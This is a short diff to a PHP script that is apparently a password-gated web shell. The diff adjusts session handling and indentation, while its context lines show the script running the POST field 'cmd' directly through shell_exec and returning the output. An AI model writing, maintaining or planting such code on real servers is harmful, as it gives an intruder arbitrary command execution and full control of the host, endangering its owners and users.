@@ -1,5 +1,6 @@
 <?php
-session_start();
+if(!isset($_SESSION)) session_start();
+$_SESSION = json_decode(json_encode($_SESSION),true);
 if(!isset($_SESSION['loggedIn'])) $_SESSION['loggedIn'] = false; 
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
@@ -57,7 +58,7 @@ if(!$_SESSION['loggedIn']) {
 	else
 	$_POST['command'] = "";
 }
-				disable_ob();
+	disable_ob();
 }
 ?>
 
